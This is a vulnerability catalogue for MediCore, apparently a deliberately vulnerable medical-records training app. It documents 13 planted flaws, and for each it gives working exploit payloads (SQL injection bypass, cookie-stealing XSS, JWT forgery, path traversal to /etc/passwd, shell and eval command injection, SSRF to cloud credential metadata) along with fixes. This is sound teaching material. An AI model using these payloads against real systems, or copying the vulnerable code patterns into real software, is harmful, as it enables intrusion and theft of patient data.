# Vulnerability Catalogue

This document describes the **10 intentional vulnerabilities** planted in
MediCore, how to trigger each one, and how it should be fixed. Everything
here is deliberate — this is a training target.

> Each issue is marked in the source with a `VULN #n` comment so you can
> match the write-up to the code.

Assume the base URL `http://localhost:3000`. Most API calls need a session
cookie — log in first (any demo account) or let the browser carry the cookie.

---

## #1 — SQL Injection · `CWE-89` · OWASP A03

**Where:** `server.js` → `POST /api/login` (and the `q` parameter of
`GET /api/patients`).

User input is concatenated directly into the SQL string:

```js
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${md5(password)}'`;
```

**Exploit — authentication bypass:**

```bash
curl -s http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' -- ","password":"anything"}'
```

`username = admin' -- ` comments out the password check and logs you in as
**admin**. `' OR '1'='1' -- ` returns the first account. The search sink
(`/api/patients?q=`) is injectable the same way.

**Fix:** use parameterized queries/prepared statements for every value —
`db.prepare('… WHERE username = ?').get(username)`.

---

## #2 — Stored Cross-Site Scripting · `CWE-79` · OWASP A03

**Where:** clinical notes (`POST /api/patients/:id/notes`) and the message
board (`POST /api/messages`) store the body verbatim; the client renders it
with `innerHTML` (`public/js/app.js` → `renderNotes`, `renderMessages`).

**Exploit:** add a clinical note or post a message with:

```html
<img src=x onerror="alert(document.cookie)">
```

The script runs in the browser of **every** clinician who opens that chart
or the message board — a stored/persistent XSS. Because the session cookie
is not `HttpOnly` (see #4), `document.cookie` discloses the token.

**Fix:** output-encode on render (use `textContent`, not `innerHTML`, or an
HTML sanitizer), and set a restrictive Content-Security-Policy.

---

## #3 — IDOR / Broken Object-Level Authorization · `CWE-639` · OWASP A01

**Where:** `server.js` → `GET /api/patients/:id`.

Any authenticated user can read **any** patient by numeric id. The owning
clinician (`primary_clinician_id`) is never checked.

**Exploit:** log in as `nwong` (a nurse) and walk the ids:

```bash
for i in $(seq 1 8); do
  curl -s --cookie "session=$TOKEN" http://localhost:3000/api/patients/$i | jq '.full_name, .ssn'
done
```

You pull every patient's full chart — name, SSN, diagnosis — regardless of
assignment.

**Fix:** enforce object ownership/role on every record access
(`WHERE id = ? AND primary_clinician_id = ?`, or a proper authz check).

---

## #4 — Broken Authentication: weak, hard-coded JWT secret · `CWE-798` · OWASP A07

**Where:** `server.js` → `const JWT_SECRET = 'secret';`

Sessions are JWTs signed with a trivially-weak secret committed to the repo.
Anyone can forge a token for any user/role. The cookie is also **not**
`HttpOnly` and **not** `Secure`.

**Exploit:** forge an admin token (secret is `secret`):

```bash
# header/payload base64url, signed HMAC-SHA256 with the key "secret"
node -e 'console.log(require("jsonwebtoken").sign({uid:1,username:"attacker",role:"admin",name:"Attacker"},"secret"))'
```

Send it as `Cookie: session=<token>` (or `Authorization: Bearer <token>`)
and you are admin — no password, no account.

**Fix:** load a long, random secret from the environment/secrets manager,
rotate it, and set cookies `HttpOnly; Secure; SameSite=Strict`.

---

## #5 — Sensitive Data Exposure · `CWE-200` · OWASP A01

**Where:** `GET /api/me`, `GET /api/patients`, `GET /api/admin/users`.

Endpoints return whole database rows — including password **hashes**, SSNs,
addresses and insurance IDs — far more than the UI needs.

**Exploit:**

```bash
curl -s --cookie "session=$TOKEN" http://localhost:3000/api/me | jq
# → { ..., "password": "<md5 hash>", "ssn": "512-88-1420" }
```

Combined with #6, the leaked MD5 hashes are crackable offline in seconds.

**Fix:** serialize an explicit allow-list of fields per response; never
return secrets or more PII than the use case requires.

---

## #6 — Weak Cryptography (unsalted MD5) · `CWE-327` · OWASP A02

**Where:** `db/seed.js` and `server.js` → `md5()` helper.

Passwords are hashed with a single round of unsalted **MD5**.

**Exploit:** the hash of `admin123` is a fixed value; any rainbow-table or
`hashcat -m 0` run recovers all demo passwords instantly. No salt means
identical passwords produce identical hashes.

**Fix:** use a memory-hard, salted KDF — **bcrypt**, **scrypt** or
**Argon2id** — with a per-user salt and an appropriate work factor.

---

## #7 — Path Traversal · `CWE-22` · OWASP A01

**Where:** `server.js` → `GET /api/records/download?file=`.

```js
const target = path.join(RECORDS_DIR, file); // no validation
```

**Exploit:** escape the records directory:

```bash
curl -s --cookie "session=$TOKEN" \
  'http://localhost:3000/api/records/download?file=../server.js'
curl -s --cookie "session=$TOKEN" \
  'http://localhost:3000/api/records/download?file=../../../../etc/passwd'
```

Arbitrary files on the host (source code, `/etc/passwd`, secrets) are read
back.

**Fix:** resolve the path and verify it stays within `RECORDS_DIR`
(`path.resolve(base, file).startsWith(base)`), or map an id → known file
instead of taking a filename.

---

## #8 — OS Command Injection · `CWE-78` · OWASP A03

**Where:** `server.js` → `POST /api/admin/network-check`.

```js
exec(`ping -c 1 ${host}`, …);  // host is user-controlled
```

**Exploit:**

```bash
curl -s --cookie "session=$TOKEN" http://localhost:3000/api/admin/network-check \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; id; cat /etc/passwd"}'
```

The shell metacharacters run extra commands → remote code execution.

**Fix:** never pass user input to a shell. Use `execFile('ping', ['-c','1',
host])` with no shell, and validate `host` against a hostname/IP allow-list.

---

## #9 — Missing Function-Level Access Control · `CWE-862` · OWASP A01

**Where:** `server.js` → `GET /api/admin/users`,
`POST /api/admin/users/:id/role`, `POST /api/admin/network-check`.

These "admin" routes only check that you are *logged in* — never that your
role is `admin`.

**Exploit:** as `nwong` (a nurse) or `billing`:

```bash
curl -s --cookie "session=$NURSE_TOKEN" http://localhost:3000/api/admin/users | jq
# dump every account (with hashes, #5) — then escalate yourself:
curl -s --cookie "session=$NURSE_TOKEN" \
  http://localhost:3000/api/admin/users/4/role \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
```

**Fix:** add a server-side role check (middleware) on every privileged
route — authorize the action, not just authentication.

---

## #10 — Security Misconfiguration · `CWE-16` / `CWE-942` · OWASP A05

**Where:** global middleware and the error handler in `server.js`.

- **Reflected-origin CORS with credentials** — `Access-Control-Allow-Origin`
  echoes the request `Origin` and `Allow-Credentials: true`, so **any**
  website can make authenticated calls to the API in a victim's browser.
- **Verbose errors** — the login handler returns the raw SQL string and the
  global handler returns `err.stack` to the client.
- **No security headers** — no CSP, HSTS, `X-Frame-Options`,
  `X-Content-Type-Options`; `X-Powered-By` left enabled.

**Exploit:** host a page on any origin that `fetch`es
`http://localhost:3000/api/patients` with `credentials:'include'` — it reads
the logged-in user's patient data cross-origin. Trigger a SQL error on login
to see the query echoed back.

**Fix:** restrict CORS to an explicit origin allow-list (don't reflect
`Origin` when credentials are allowed), return generic error messages, and
add security headers (e.g. via `helmet`) incl. a strict CSP.

---

## Prescriptions module (feature branch additions)

The prescriptions & pharmacy-notification feature adds three **new** classes
of vulnerability on top of the original ten.

### #11 — Mass Assignment · `CWE-915` · OWASP A08

**Where:** `server.js` → `POST /api/prescriptions`.

The handler spreads the entire request body into the row **after** setting
server defaults, so client-supplied fields win:

```js
const rx = { prescriber: req.user.name, status: 'active', ...req.body, … };
```

**Exploit:** set fields the UI never exposes — forge the prescriber, flip
status, or seed a column a future workflow trusts:

```bash
curl -s --cookie "session=$TOKEN" http://localhost:3000/api/prescriptions \
  -H 'Content-Type: application/json' \
  -d '{"patient_id":1,"drug":"Oxycodone","prescriber":"Dr. Alice Reed","status":"approved"}'
```

The same concatenated INSERT is also a SQL-injection sink (class of #1).

**Fix:** bind an explicit allow-list of columns; never spread untrusted
input into a record. Use parameterized queries.

### #12 — Server-Side Code Injection (`eval`) · `CWE-94` · OWASP A03

**Where:** `server.js` → `POST /api/prescriptions/calc-dose`.

```js
const result = eval(formula); // formula is user input
```

**Exploit:** the "dosage formula" runs as server-side JavaScript → RCE:

```bash
curl -s --cookie "session=$TOKEN" http://localhost:3000/api/prescriptions/calc-dose \
  -H 'Content-Type: application/json' \
  -d '{"weight":70,"formula":"require(\"child_process\").execSync(\"id\").toString()"}'
```

**Fix:** never `eval` input. Use a safe arithmetic parser (e.g. a math
expression library) or a fixed set of named formulas.

### #13 — Server-Side Request Forgery · `CWE-918` · OWASP A10

**Where:** `server.js` → `POST /api/prescriptions/notify-pharmacy`.

The server makes an outbound request to a client-supplied URL and reflects
the response back.

**Exploit:** reach internal-only services / cloud metadata:

```bash
curl -s --cookie "session=$TOKEN" http://localhost:3000/api/prescriptions/notify-pharmacy \
  -H 'Content-Type: application/json' \
  -d '{"pharmacy_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

**Fix:** allow-list destination hosts/schemes, resolve and block
private/link-local IP ranges, disable redirects, and never return the raw
upstream body.

---

## Remediation checklist

- [ ] #1 Parameterized queries everywhere
- [ ] #2 Output encoding / sanitization + CSP
- [ ] #3 Per-object authorization checks
- [ ] #4 Env-based random secret; `HttpOnly; Secure` cookies
- [ ] #5 Field allow-lists on responses
- [ ] #6 Argon2id/bcrypt with salts
- [ ] #7 Path containment validation
- [ ] #8 `execFile` + input validation
- [ ] #9 Role-based middleware on admin routes
- [ ] #10 CORS allow-list, generic errors, security headers
